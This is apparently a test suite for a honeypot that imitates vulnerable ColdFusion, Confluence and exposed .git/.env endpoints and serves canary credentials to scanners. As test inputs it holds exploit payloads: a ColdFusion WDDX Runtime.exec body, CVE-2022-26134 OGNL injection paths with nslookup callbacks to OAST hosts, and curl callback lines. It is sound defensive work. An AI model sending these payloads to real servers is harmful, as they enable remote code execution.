    monkeypatch.setattr(tbenv, "GEOSERVER_ENABLED", False)
    resp = await flux_client.get(
        "/geoserver/web/", headers={"X-Forwarded-For": "203.0.113.67"}
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- ColdFusion trap ---


def test_coldfusion_enabled_by_default():
    assert tbenv.COLDFUSION_ENABLED


def test_coldfusion_default_paths_cover_observed_family():
    for path in (
        "/indice.cfm",
        "/menu.cfm",
        "/base.cfm",
        "/CFIDE/componentutils/",
        "/CFIDE/administrator/index.cfm",
        "/CFIDE/adminapi/administrator.cfc",
    ):
        assert tbenv.is_coldfusion_path(path), f"expected match: {path}"


def test_coldfusion_path_non_match():
    for path in ["/", "/index.cfm", "/administrator/", "/cfide", "/geoserver/web/"]:
        assert not tbenv.is_coldfusion_path(path), f"unexpected match: {path}"


def test_coldfusion_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "COLDFUSION_ENABLED", False)
    assert not tbenv.is_coldfusion_path("/CFIDE/componentutils/")


def test_coldfusion_has_exploit_detects_adminapi_and_runtime():
    assert tbenv._coldfusion_has_exploit(
        "/CFIDE/adminapi/administrator.cfc", "method=login", ""
    )
    assert tbenv._coldfusion_has_exploit(
        "/CFIDE/componentutils/",
        "",
        '<wddxPacket><string>Runtime.getRuntime().exec("id")</string></wddxPacket>',
    )
    assert not tbenv._coldfusion_has_exploit("/menu.cfm", "", "normal")


def test_render_coldfusion_public_page_links_followups():
    body = tbenv.render_coldfusion_public_page(
        "/menu.cfm", "victim.example", "2021.0.05",
    ).decode("utf-8")
    assert "Adobe ColdFusion 2021.0.05" in body
    assert "/CFIDE/componentutils/" in body
    assert "/CFIDE/administrator/index.cfm" in body


def test_render_coldfusion_adminapi_escapes_method_name():
    body = tbenv.render_coldfusion_adminapi("<x>", "2021.0.05").decode("utf-8")
    assert "&lt;x&gt;" in body
    assert "<x>" not in body


async def test_dispatch_coldfusion_public_cfm(flux_client):
    resp = await flux_client.get(
        "/menu.cfm",
        headers={"X-Forwarded-For": "203.0.113.71", "Host": "cf.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "ColdFusion application server" in text
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "coldfusion-public-cfm"
    assert entry["coldfusionPath"] == "/menu.cfm"
    assert entry["coldfusionHasExploit"] is False


async def test_dispatch_coldfusion_componentutils_logs_exploit_body(flux_client):
    body = b'<wddxPacket><string>Runtime.getRuntime().exec("id")</string></wddxPacket>'
    resp = await flux_client.post(
        "/CFIDE/componentutils/",
        data=body,
        headers={
            "X-Forwarded-For": "203.0.113.72",
            "Content-Type": "text/xml",
        },
    )
    assert resp.status == 200
    text = await resp.text()
    assert "ColdFusion Component Browser" in text
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "coldfusion-componentutils"
    assert entry["coldfusionHasExploit"] is True
    assert "coldfusionPayloadPreview" in entry
    assert "Runtime.getRuntime" in entry["bodyPreview"]


async def test_dispatch_coldfusion_admin_post_captures_auth_and_body(flux_client):
    resp = await flux_client.post(
        "/CFIDE/administrator/enter.cfm",
        data="cfadminPassword=guess",
        headers={
            "X-Forwarded-For": "203.0.113.73",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "CFID=1; CFTOKEN=abc",
        },
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Data Sources" in text
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "coldfusion-admin-post"
    assert entry["coldfusionHasAuth"] is True
    assert entry["coldfusionHasExploit"] is True
    assert "cfadminPassword" in entry["bodyPreview"]


async def test_dispatch_coldfusion_adminapi_logs_method(flux_client):
    resp = await flux_client.get(
        "/CFIDE/adminapi/administrator.cfc?method=login",
        headers={"X-Forwarded-For": "203.0.113.74"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<wddxPacket" in text
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "coldfusion-adminapi"
    assert entry["coldfusionAction"] == "login"
    assert entry["coldfusionHasExploit"] is True


async def test_dispatch_coldfusion_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "COLDFUSION_ENABLED", False)
    resp = await flux_client.get(
        "/CFIDE/componentutils/", headers={"X-Forwarded-For": "203.0.113.75"}
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"



# --- _env_bool: explicit env var parsing ---


def test_env_bool_reads_truthy_string(monkeypatch):
    """Explicit env values are honored; defaults are overridden."""
    monkeypatch.setenv("FLUX_TEST_BOOL", "YES")
    assert tbenv._env_bool("FLUX_TEST_BOOL", default=False) is True
    monkeypatch.setenv("FLUX_TEST_BOOL", "nope")
    assert tbenv._env_bool("FLUX_TEST_BOOL", default=True) is False
    monkeypatch.delenv("FLUX_TEST_BOOL", raising=False)
    assert tbenv._env_bool("FLUX_TEST_BOOL", default=True) is True


# --- Pure LLM renderers ---


def test_render_ollama_chat_shape():
    import json
    payload = json.loads(tbenv.render_ollama_chat("llama3.1:8b"))
    assert payload["model"] == "llama3.1:8b"
    assert payload["done"] is True
    assert payload["message"]["role"] == "assistant"
    assert payload["message"]["content"]


def test_render_ollama_chat_defaults_model():
    import json
    payload = json.loads(tbenv.render_ollama_chat(""))
    assert payload["model"]  # non-empty default


def test_render_ollama_generate_shape():
    import json
    payload = json.loads(tbenv.render_ollama_generate("mistral:7b"))
    assert payload["model"] == "mistral:7b"
    assert payload["done"] is True
    assert payload["response"]


def test_render_openai_completion_shape():
    import json
    payload = json.loads(tbenv.render_openai_completion("gpt-4o"))
    assert payload["object"] == "text_completion"
    assert payload["model"] == "gpt-4o"
    assert payload["choices"][0]["text"]
    assert payload["choices"][0]["finish_reason"] == "stop"


def test_render_openai_embedding_shape():
    import json
    payload = json.loads(tbenv.render_openai_embedding(""))
    assert payload["object"] == "list"
    assert payload["model"]  # default populated
    assert isinstance(payload["data"][0]["embedding"], list)
    assert all(isinstance(v, (int, float)) for v in payload["data"][0]["embedding"])


def test_render_ollama_ps_shape():
    import json
    payload = json.loads(tbenv.render_ollama_ps())
    assert payload == {"models": []}


# --- extract_llm_prompt: edge shapes ---


def test_extract_llm_prompt_embedding_list_input():
    model, prompt, action, has_auth = tbenv.extract_llm_prompt(
        b'{"model":"text-embedding-3-small","input":["hello","world"]}',
        "application/json",
    )
    assert model == "text-embedding-3-small"
    assert action == "embedding"
    assert "hello" in prompt and "world" in prompt
    assert has_auth is False


def test_extract_llm_prompt_embedding_scalar_input():
    _, prompt, action, _ = tbenv.extract_llm_prompt(
        b'{"model":"text-embedding-3-small","input":42}',
        "application/json",
    )
    assert action == "embedding"
    assert prompt == "42"


def test_extract_llm_prompt_messages_skips_non_dict_entries():
    _, prompt, action, _ = tbenv.extract_llm_prompt(
        b'{"model":"gpt-4o","messages":[null,{"role":"user","content":"hi"}]}',
        "application/json",
    )
    assert action == "chat"
    assert "hi" in prompt


def test_extract_llm_prompt_messages_coerces_non_string_content():
    _, prompt, action, _ = tbenv.extract_llm_prompt(
        b'{"model":"gpt-4o","messages":[{"role":"user","content":7}]}',
        "application/json",
    )
    assert action == "chat"
    assert "7" in prompt


# --- simulate_command_output: remaining branches ---


def test_simulate_command_output_hostname():
    assert tbenv.simulate_command_output("hostname") == "web-01\n"


def test_simulate_command_output_pwd():
    assert tbenv.simulate_command_output("pwd").startswith("/var/www/html")


def test_simulate_command_output_ls():
    assert "wp_filemanager.php" in tbenv.simulate_command_output("ls")


def test_simulate_command_output_w_who():
    assert tbenv.simulate_command_output("who") == "\n"


# --- parse_cookies: malformed parts ---


def test_parse_cookies_skips_malformed_parts():
    result = tbenv.parse_cookies("; good=1; bad; another=2")
    assert result == {"good": "1", "another": "2"}


# --- _parse_chain_params ---


def test_parse_chain_params_extracts_both():
    assert tbenv._parse_chain_params("_hp_chain=abc&_hp_hop=3") == ("abc", 3)


def test_parse_chain_params_empty():
    assert tbenv._parse_chain_params("") == ("", 0)


def test_parse_chain_params_non_integer_hop_silently_zero():
    # Malformed hop must not raise — scanners send junk.
    assert tbenv._parse_chain_params("_hp_chain=abc&_hp_hop=xyz") == ("abc", 0)


def test_parse_chain_params_ignores_unrelated_and_keyless_parts():
    assert tbenv._parse_chain_params("foo=bar&keyless&_hp_chain=cid") == ("cid", 0)


# --- Tarpit modules (pure classes) ---


class _Ctx:
    """Minimal stand-in for a tarpit ctx dict in augment-only tests."""


def _log_ctx():
    return {"clientIp": "203.0.113.5", "path": "/", "host": "", "query": ""}


def test_cookie_tracking_augment_sets_cookie_and_records_returned_tid():
    mod = tbenv.CookieTrackingModule()

    class FakeReq:
        headers = {"Cookie": "_hp_tid=prev-id; foo=bar"}

    headers, meta = mod.augment(FakeReq(), {"log_context": _log_ctx(), "path": "/"})
    assert "_hp_tid=" in headers["Set-Cookie"]
    assert "HttpOnly" in headers["Set-Cookie"]
    assert meta["cookieReturned"] == "prev-id"
    assert meta["cookieId"]  # fresh per-request id


def test_cookie_tracking_augment_first_visit_has_no_returned_tid():
    mod = tbenv.CookieTrackingModule()

    class FakeReq:
        headers = {"Cookie": ""}

    _, meta = mod.augment(FakeReq(), {})
    assert "cookieReturned" not in meta
    assert meta["cookieId"]


def test_etag_probe_augment_no_conditional_headers():
    mod = tbenv.ETagProbeModule()

    class FakeReq:
        headers = {}

    headers, meta = mod.augment(FakeReq(), {"request_id": "req-abc"})
    assert headers["ETag"] == '"req-abc"'
    assert headers["Last-Modified"]
    assert meta["etag"] == '"req-abc"'
    assert "conditionalRequest" not in meta


def test_etag_probe_augment_records_if_none_match_and_if_modified_since():
    mod = tbenv.ETagProbeModule()

    class FakeReq:
        headers = {
            "If-None-Match": '"prev"',
            "If-Modified-Since": "Mon, 01 Jan 2024 00:00:00 GMT",
        }

    _, meta = mod.augment(FakeReq(), {"request_id": "x"})
    assert meta["conditionalRequest"] is True
    assert meta["ifNoneMatch"] == '"prev"'
    assert meta["ifModifiedSince"].startswith("Mon,")


def test_content_length_mismatch_augment_returns_claimed_bytes(monkeypatch):
    monkeypatch.setattr(tbenv, "MOD_CONTENT_LENGTH_CLAIMED_BYTES", 1_000_000_000)
    mod = tbenv.ContentLengthMismatchModule()
    headers, meta = mod.augment(None, {})
    assert headers["Content-Length"] == "1000000000"
    assert meta["claimedBytes"] == 1_000_000_000


def test_redirect_chain_should_run_false_when_chain_already_set(monkeypatch):
    monkeypatch.setattr(tbenv, "MOD_REDIRECT_CHAIN_ENABLED", True)
    mod = tbenv.RedirectChainModule()
    assert not mod.should_run({"query": "_hp_chain=existing"})
    # And true for the initial request (no chain param yet).
    assert mod.should_run({"query": "other=1"})
    assert mod.should_run({"query": ""})


def test_dns_callback_should_run_requires_domain(monkeypatch):
    monkeypatch.setattr(tbenv, "MOD_DNS_CALLBACK_ENABLED", True)
    monkeypatch.setattr(tbenv, "MOD_DNS_CALLBACK_DOMAIN", "")
    assert not tbenv.DNSCallbackModule().should_run({})
    monkeypatch.setattr(tbenv, "MOD_DNS_CALLBACK_DOMAIN", "track.example")
    assert tbenv.DNSCallbackModule().should_run({})


def test_tarpit_module_base_defaults():
    """Base class is a no-op. Subclasses opt in by overriding."""
    base = tbenv.TarpitModule()
    assert base.should_run({}) is False
    headers, meta = base.augment(None, {})
    assert headers == {} and meta == {}


# --- build_tarpit_chunk ---


def test_build_tarpit_chunk_pads_to_chunk_bytes_plus_newline(monkeypatch):
    monkeypatch.setattr(tbenv, "TARPIT_CHUNK_BYTES", 64)
    chunk = tbenv.build_tarpit_chunk("abcdef1234567890-req", "/short", 1)
    assert len(chunk) == 65  # TARPIT_CHUNK_BYTES + trailing newline
    assert chunk.endswith(b"\n")
    assert b"TRACEBIT_TARPIT_" in chunk
    assert b"/short" in chunk


def test_build_tarpit_chunk_truncates_long_payload(monkeypatch):
    monkeypatch.setattr(tbenv, "TARPIT_CHUNK_BYTES", 8)
    long_path = "/" + ("verylongpath" * 20)
    chunk = tbenv.build_tarpit_chunk("req", long_path, 7)
    assert len(chunk) == 9  # 8 + newline
    assert chunk.endswith(b"\n")


# --- format_env_payload ---


def test_format_env_payload_includes_aws_ssh_and_http_blocks():
    response = {
        "aws": {
            "awsAccessKeyId": "AKIAEXAMPLE",
            "awsSecretAccessKey": "supersecret",
            "awsSessionToken": "token123",
            "awsExpiration": "2030-01-01T00:00:00Z",
        },
        "ssh": {
            "sshIp": "198.51.100.5",
            "sshPrivateKey": "PRIV",
            "sshPublicKey": "PUB",
            "sshExpiration": "2030-01-01T00:00:00Z",
        },
        "http": {
            "gitlab-cookie": {
                "credentials": {"name": "_gitlab_session", "value": "v"},
                "hostNames": ["gitlab.example"],
                "expiresAt": "2030-01-01T00:00:00Z",
            },
        },
    }
    payload = tbenv.format_env_payload(response)
    assert "AWS_ACCESS_KEY_ID=AKIAEXAMPLE" in payload
    assert "SSH_HOST=198.51.100.5" in payload
    assert "SSH_PRIVATE_KEY_B64=PRIV" in payload
    # http blocks upper-case + underscore the canary type
    assert "GITLAB_COOKIE_HOSTNAMES=gitlab.example" in payload
    assert "GITLAB_COOKIE_EXPIRATION=2030-01-01T00:00:00Z" in payload
    # credentials are JSON-encoded inline
    assert '"_gitlab_session"' in payload


def test_format_env_payload_empty_response_returns_empty_body():
    # An upstream that returns nothing usable must render as an empty body,
    # not a self-labelling error sentinel. An empty .env is unremarkable;
    # "TRACEBIT_CANARY_ERROR=..." would burn the trap.
    assert tbenv.format_env_payload({}) == ""


def test_format_env_payload_ignores_non_dict_entries():
    # Defensive: upstream must not crash flux. Also must not leak a tell.
    payload = tbenv.format_env_payload({"aws": "not a dict", "http": "also not", "ssh": None})
    assert payload == ""


def test_format_env_payload_no_honeypot_tell_in_output():
    # The rendered payload is served to the attacker on /.env; any literal
    # mention of "honeypot", "autogenerated", "canary", "tracebit", or
    # "issued_at" anywhere in the body burns the trap. Covers every populated
    # branch so credential-key names are guarded alongside headers.
    response = {
        "aws": {
            "awsAccessKeyId": "AKIAEXAMPLE",
            "awsSecretAccessKey": "supersecret",
            "awsSessionToken": "token123",
            "awsExpiration": "2030-01-01T00:00:00Z",
        },
        "ssh": {
            "sshIp": "198.51.100.5",
            "sshPrivateKey": "PRIV",
            "sshPublicKey": "PUB",
            "sshExpiration": "2030-01-01T00:00:00Z",
        },
        "http": {
            "gitlab-cookie": {
                "credentials": {"name": "_gitlab_session", "value": "v"},
                "hostNames": ["gitlab.example"],
                "expiresAt": "2030-01-01T00:00:00Z",
            },
        },
    }
    payload = tbenv.format_env_payload(response).lower()
    for tell in ("honeypot", "autogenerated", "canary", "tracebit", "issued_at"):
        assert tell not in payload, f"payload leaks '{tell}'"
    # Empty response must also not leak.
    assert tbenv.format_env_payload({}) == ""


# --- Fake git primitives ---


def test_git_loose_object_is_valid_for_blob():
    import zlib
    content = b"hello, git\n"
    sha, blob_bytes = tbenv._git_loose_object(b"blob", content)
    raw = zlib.decompress(blob_bytes)
    # Git loose-object header: "blob <len>\x00" + content
    header, _, body = raw.partition(b"\x00")
    assert header == b"blob 11"
    assert body == content
    # Canonical git sha = sha1(header\x00 + content)
    import hashlib
    assert sha == hashlib.sha1(raw).hexdigest()


def test_git_tree_entry_packs_mode_name_and_binary_sha():
    entry = tbenv._git_tree_entry("100644", "README.md", "1" * 40)
    assert entry.startswith(b"100644 README.md\x00")
    assert entry[-20:] == bytes.fromhex("1" * 40)


def test_format_secrets_yaml_embeds_aws_canary():
    body = tbenv._format_secrets_yaml({"aws": {
        "awsAccessKeyId": "AKIAFAKEYAML01",
        "awsSecretAccessKey": "yamlSecret",
        "awsSessionToken": "yamlTok",
        "awsExpiration": "2030-01-01T00:00:00Z",
    }})
    assert "access_key_id: AKIAFAKEYAML01" in body
    assert "session_token: yamlTok" in body
    assert body.startswith("# config/secrets.yml")


def test_format_secrets_yaml_tolerates_missing_aws():
    # Not expected in practice, but the function must not crash.
    body = tbenv._format_secrets_yaml({})
    assert "access_key_id:" in body  # placeholder line still present


def test_build_fake_repo_produces_expected_layout_and_sha_linkage():
    import zlib
    secrets_body = tbenv._format_secrets_yaml({"aws": {
        "awsAccessKeyId": "AKIATESTREPO",
        "awsSecretAccessKey": "x", "awsSessionToken": "y", "awsExpiration": "z",
    }})
    files, meta = tbenv._build_fake_repo(secrets_body)

    # The minimum surface a git-dumper walks. Keys are lowercased so
    # lookups via extract_git_path() (which returns a lowercase key) match
    # regardless of the case a scanner uses on the wire.
    for required in ("/.git/head", "/.git/config", "/.git/refs/heads/main",
                     "/.git/packed-refs", "/.git/info/refs", "/.git/logs/head"):
        assert required in files, required

    # refs/heads/main + packed-refs both reference the commit SHA.
    assert meta["commitSha"] in files["/.git/refs/heads/main"].decode()
    assert meta["commitSha"] in files["/.git/packed-refs"].decode()

    # The secrets blob object exists at its hashed path and decompresses
    # to a body that still carries the canary.
    secrets_path = f"/.git/objects/{meta['secretsBlobSha'][:2]}/{meta['secretsBlobSha'][2:]}"
    assert secrets_path in files
    raw = zlib.decompress(files[secrets_path])
    assert raw.startswith(b"blob ")
    assert b"AKIATESTREPO" in raw

    # Commit object references the root tree sha.
    commit_path = f"/.git/objects/{meta['commitSha'][:2]}/{meta['commitSha'][2:]}"
    commit_raw = zlib.decompress(files[commit_path])
    assert commit_raw.startswith(b"commit ")
    assert f"tree {meta['rootTreeSha']}".encode() in commit_raw


# --- /.git/config URL embeds Tracebit canary (git-config-canary) ---


def test_fake_git_config_url_embeds_canary_credential(monkeypatch):
    # With no operator override, the URL userinfo is the Tracebit AWS key
    # pair — so a scraper that only reads /.git/config still walks away
    # with a live canary.
    monkeypatch.setattr(tbenv, "FAKE_GIT_REMOTE_URL", "")
    secrets_body = tbenv._format_secrets_yaml(FAKE_TRACEBIT)
    files, _meta = tbenv._build_fake_repo(secrets_body, FAKE_TRACEBIT)
    config = files["/.git/config"].decode()
    assert "url = https://AKIAFAKEEXAMPLE01:" in config
    # '/' '+' '=' in the secret are percent-encoded so downstream URL
    # parsers don't choke.
    assert "wJalrXUtnFEMI%2FK7MDENG%2FbPxRfiCYEXAMPLEKEY" in config
    assert "@github.com/internal/tools.git" in config


def test_fake_git_config_url_respects_operator_override(monkeypatch):
    # If the operator pins FAKE_GIT_REMOTE_URL, it's used verbatim.
    monkeypatch.setattr(tbenv, "FAKE_GIT_REMOTE_URL", "git@corp.example:myrepo.git")
    secrets_body = tbenv._format_secrets_yaml(FAKE_TRACEBIT)
    files, _meta = tbenv._build_fake_repo(secrets_body, FAKE_TRACEBIT)
    config = files["/.git/config"].decode()
    assert "url = git@corp.example:myrepo.git" in config
    # No canary leaked in the URL when an override is set.
    assert "AKIAFAKEEXAMPLE01" not in config


def test_fake_git_config_url_falls_back_when_canary_missing(monkeypatch):
    # If Tracebit returns a response without AWS creds, we must not emit
    # a malformed URL — fall back to a static SSH URL.
    monkeypatch.setattr(tbenv, "FAKE_GIT_REMOTE_URL", "")
    secrets_body = tbenv._format_secrets_yaml({})
    files, _meta = tbenv._build_fake_repo(secrets_body, {})
    config = files["/.git/config"].decode()
    assert "url = git@github.com:internal/tools.git" in config


# --- extract_git_path: prefix + case-insensitive coverage ---


@pytest.mark.parametrize("path,expected", [
    # Direct /.git/ access
    ("/.git/config", "/.git/config"),
    ("/.git/HEAD", "/.git/head"),
    ("/.git/refs/heads/main", "/.git/refs/heads/main"),
    # Root pointers
    ("/.git", "/.git/"),
    ("/.git/", "/.git/"),
    # Case variants
    ("/.GIT/CONFIG", "/.git/config"),
    ("/.Git/Config", "/.git/config"),
    ("/.gIt/cOnFiG", "/.git/config"),
    # Prefixed-app variants (app deployed at subpath)
    ("/login/.git/config", "/.git/config"),
    ("/project/.git/HEAD", "/.git/head"),
    ("/api/.git/index", "/.git/index"),
    ("/backend/.git/refs/heads/main", "/.git/refs/heads/main"),
    # Nested prefix
    ("/a/b/c/.git/config", "/.git/config"),
    # Case-variant inside a prefix
    ("/Login/.GiT/CoNfIg", "/.git/config"),
])
def test_extract_git_path_recognises_git_requests(path, expected):
    assert tbenv.extract_git_path(path) == expected


@pytest.mark.parametrize("path", [
    "/",
    "/.env",
    "/.gitignore",
    "/.gitconfig",
    "/.git-credentials",
    "/gitconfig",
    "/foo/bar",
    "",
    # `.git` as part of a filename segment, not a directory
    "/.gitlab-ci.yml",
    # Decoy — must require actual `/.git/` substring
    "/gitrepo/config",
])
def test_extract_git_path_ignores_non_git_requests(path):
    assert tbenv.extract_git_path(path) is None


# --- /.git/index placeholder ---


def test_fake_git_index_is_valid_dirc_header():
    secrets_body = tbenv._format_secrets_yaml(FAKE_TRACEBIT)
    files, _meta = tbenv._build_fake_repo(secrets_body, FAKE_TRACEBIT)
    index = files["/.git/index"]
    # Signature + version 2 + entry count 0 + 20 zero bytes (trailer slot).
    assert index.startswith(b"DIRC")
    assert index[4:8] == b"\x00\x00\x00\x02"
    assert index[8:12] == b"\x00\x00\x00\x00"
    assert len(index) == 32


def test_fake_git_credentials_leaf_embeds_gitlab_canary():
    secrets_body = tbenv._format_secrets_yaml(FAKE_TRACEBIT)
    files, _meta = tbenv._build_fake_repo(secrets_body, FAKE_TRACEBIT)
    body = files["/.git/credentials"].decode("utf-8")
    assert body.startswith("https://deploybot42:")
    assert "p%40ssCanaryValue" in body
    assert "@gitlab.canary.example" in body


# --- _close_http_session lifecycle ---


async def test_close_http_session_closes_lazy_session():
    # Prime a session, then verify cleanup hook closes it and clears the global.
    session = await tbenv._get_http_session()
    assert not session.closed
    await tbenv._close_http_session(None)
    assert session.closed
    assert tbenv._http_session is None


async def test_close_http_session_is_safe_when_nothing_opened():
    # Reset, then call cleanup with no prior session — must not raise.
    tbenv._http_session = None
    await tbenv._close_http_session(None)
    assert tbenv._http_session is None


# --- /confirm-credentials ---
#
# Tracebit's dashboard only marks an issued canary as "active / deployed"
# once /confirm-credentials is POSTed with its confirmationId. Without
# this, the active-key list stays at whatever was confirmed manually
# (the symptom the user noticed: only 3 active SSH keys despite many
# id_rsa hits). These tests pin down extraction, dispatch, and the
# wiring from issue_credentials.


def test_extract_confirmation_ids_finds_aws_ssh_and_http():
    ids = tbenv._extract_confirmation_ids(FAKE_TRACEBIT)
    assert set(ids) == {"conf-aws-1", "conf-ssh-1", "conf-gup-1", "conf-gc-1"}


def test_extract_confirmation_ids_skips_missing_or_malformed():
    # Empty / non-dict / missing top-level keys — no ids, no exceptions.
    assert tbenv._extract_confirmation_ids({}) == []
    assert tbenv._extract_confirmation_ids(None) == []
    assert tbenv._extract_confirmation_ids("not a dict") == []
    # Block present but the confirmation id is missing or wrong shape.
    assert tbenv._extract_confirmation_ids({"aws": {"awsAccessKeyId": "x"}}) == []
    assert tbenv._extract_confirmation_ids({"ssh": {"sshConfirmationId": ""}}) == []
    assert tbenv._extract_confirmation_ids({"http": {"x": {"confirmationId": None}}}) == []


async def test_schedule_confirmations_fires_one_task_per_id(monkeypatch):
    """_schedule_confirmations creates one create_task per extracted id,
    each calling confirm_credential. Drains the tasks via asyncio.sleep
    so the test is deterministic."""
    seen: list[str] = []

    async def fake_confirm(confirmation_id):
        seen.append(confirmation_id)

    monkeypatch.setattr(tbenv, "confirm_credential", fake_confirm)
    tbenv._schedule_confirmations(FAKE_TRACEBIT)
    # Yield to the event loop so the scheduled tasks run.
    for _ in range(3):
        import asyncio
        await asyncio.sleep(0)
    assert set(seen) == {"conf-aws-1", "conf-ssh-1", "conf-gup-1", "conf-gc-1"}


async def test_schedule_confirmations_no_running_loop_is_silent():
    """Called from a sync context (no loop) — must not raise. Lets us
    keep _schedule_confirmations safe to call from anywhere without
    extra guards at the caller."""
    # Run inside a thread without an event loop.
    import asyncio as _asyncio
    import threading

    errors: list[BaseException] = []

    def runner():
        try:
            tbenv._schedule_confirmations(FAKE_TRACEBIT)
        except BaseException as exc:  # pragma: no cover — failure path
            errors.append(exc)

    t = threading.Thread(target=runner)
    t.start()
    t.join(timeout=1.0)
    assert errors == [], f"unexpected raise: {errors!r}"
    _ = _asyncio  # keep import grouped with the other asyncio uses


class _FakeResp:
    def __init__(self, payload, *, status=200):
        self._payload = payload
        self.status = status
        self.raised = False

    async def __aenter__(self):
        return self

    async def __aexit__(self, *_a):
        return False

    def raise_for_status(self):
        self.raised = True

    async def json(self):
        return self._payload


class _FakeSession:
    def __init__(self):
        self.posts: list[tuple[str, dict]] = []
        self.issue_payload: dict | None = None

    def post(self, url, *, json=None, headers=None):
        self.posts.append((url, json))
        if "confirm-credentials" in url:
            return _FakeResp(None, status=204)
        return _FakeResp(self.issue_payload)


async def test_issue_credentials_posts_confirm_for_each_canary_type(monkeypatch):
    """End-to-end: issue_credentials returns the response and schedules a
    /confirm-credentials POST for every confirmationId in it. This is the
    bug fix — issued SSH keys (and aws / http canaries) now show up as
    active in the Tracebit dashboard."""
    fake = _FakeSession()
    fake.issue_payload = FAKE_TRACEBIT

    async def get_session():
        return fake

    monkeypatch.setattr(tbenv, "_get_http_session", get_session)
    monkeypatch.setattr(tbenv, "API_KEY", "test-key")

    result = await tbenv.issue_credentials(
        request_id="req-1",
        client_ip="203.0.113.50",
        host="trap.example",
        user_agent="curl/8",
        path="/.env",
        proto="https",
    )
    assert result is FAKE_TRACEBIT

    # Drain the scheduled fire-and-forget confirmations.
    import asyncio
    for _ in range(5):
        await asyncio.sleep(0)

    issue_calls = [body for url, body in fake.posts if url.endswith("/issue-credentials")]
    confirm_calls = [body for url, body in fake.posts if url.endswith("/confirm-credentials")]
    assert len(issue_calls) == 1
    assert {body["id"] for body in confirm_calls} == {
        "conf-aws-1", "conf-ssh-1", "conf-gup-1", "conf-gc-1",
    }


async def test_confirm_credential_skips_when_api_key_missing(monkeypatch):
    """No API_KEY → no POST. Mirrors the existing dispatch-time gating
    so tests that null out API_KEY don't accidentally trigger network."""
    posted: list[str] = []

    class _Recorder:
        def post(self, url, **_):
            posted.append(url)
            return _FakeResp(None)

    async def get_session():
        return _Recorder()

    monkeypatch.setattr(tbenv, "_get_http_session", get_session)
    monkeypatch.setattr(tbenv, "API_KEY", "")
    await tbenv.confirm_credential("conf-x")
    assert posted == []


async def test_confirm_credential_swallows_network_errors(monkeypatch):
    """Confirmation is best-effort — a Tracebit outage must not raise
    out of the fire-and-forget task and crash the worker."""
    import aiohttp as _aiohttp

    class _BoomResp:
        async def __aenter__(self):
            raise _aiohttp.ClientConnectionError("connection refused")

        async def __aexit__(self, *_a):
            return False

    class _BoomSession:
        def post(self, *_a, **_kw):
            return _BoomResp()

    async def get_session():
        return _BoomSession()

    monkeypatch.setattr(tbenv, "_get_http_session", get_session)
    monkeypatch.setattr(tbenv, "API_KEY", "test-key")
    # Must return None without raising.
    assert await tbenv.confirm_credential("conf-x") is None


# --- Method handling ---


async def test_dispatch_rejects_unsupported_methods(flux_client):
    """PUT / DELETE / etc. short-circuit to 405. Prevents confused logging
    downstream and stops tarpit/canary logic from running on odd verbs."""
    resp = await flux_client.put("/anything", data=b"x")
    assert resp.status == 405


# --- Confluence trap (CVE-2022-26134 OGNL RCE bait) ---


def test_confluence_enabled_by_default():
    assert tbenv.CONFLUENCE_ENABLED


def test_confluence_default_paths_cover_observed_probes():
    for path in (
        "/pages/createpage-entervariables.action",
        "/confluence/pages/createpage-entervariables.action",
        "/wiki/pages/createpage-entervariables.action",
        "/pages/doenterpagevariables.action",
        "/templates/editor-preload-container",
        "/users/user-dark-features",
        "/login.action",
    ):
        assert tbenv.is_confluence_path(path), f"expected match: {path}"


def test_confluence_path_matches_url_encoded_ognl_in_path():
    # Canonical CVE-2022-26134 path shape — URL-encoded OGNL expression
    # as the first path segment.
    encoded = "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20abc.oast.me%22%29%7D/"
    assert tbenv.is_confluence_path(encoded)
    # Raw (decoded) shape, in case nginx normalises it for us.
    assert tbenv.is_confluence_path("/${@java.lang.Runtime@getRuntime().exec(\"id\")}/")


def test_confluence_path_non_match():
    for path in (
        "/",
        "/index.html",
        "/.env",
        "/pages/",  # too generic
        "/wiki/",   # too generic, no action
        "/pages/foo.html",
    ):
        assert not tbenv.is_confluence_path(path), f"unexpected match: {path}"


def test_confluence_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "CONFLUENCE_ENABLED", False)
    assert not tbenv.is_confluence_path("/pages/createpage-entervariables.action")
    assert not tbenv.is_confluence_path("/${@java.lang.Runtime@getRuntime().exec(\"id\")}/")


def test_confluence_has_ognl_indicators():
    assert tbenv._confluence_has_ognl(
        "/${@java.lang.Runtime@getRuntime().exec(\"x\")}/", "", "",
    )
    assert tbenv._confluence_has_ognl(
        "/%24%7b%40java.lang.runtime%40getruntime%28%29.exec/", "", "",
    )
    assert tbenv._confluence_has_ognl(
        "/pages/createpage-entervariables.action",
        "",
        '${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id"))}',
    )
    assert not tbenv._confluence_has_ognl("/login.action", "", "")
    assert not tbenv._confluence_has_ognl("/pages/", "os_username=admin", "")


def test_confluence_extract_oast_callback_url_encoded():
    payload = (
        "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22"
        "nslookup%20d7o9gl5q3g2u7gjrcdmgdpjnby6nsjaud.oast.me%22%29%7D/"
    )
    assert (
        tbenv._extract_oast_callback(payload)
        == "d7o9gl5q3g2u7gjrcdmgdpjnby6nsjaud.oast.me"
    )


def test_confluence_extract_oast_callback_multi_family():
    for hostname in (
        "abcd.oast.me",
        "abcd.interact.sh",
        "abcd.dnslog.cn",
        "deadbeef.burpcollaborator.net",
    ):
        text = f'curl http://{hostname}/x'
        assert tbenv._extract_oast_callback(text) == hostname


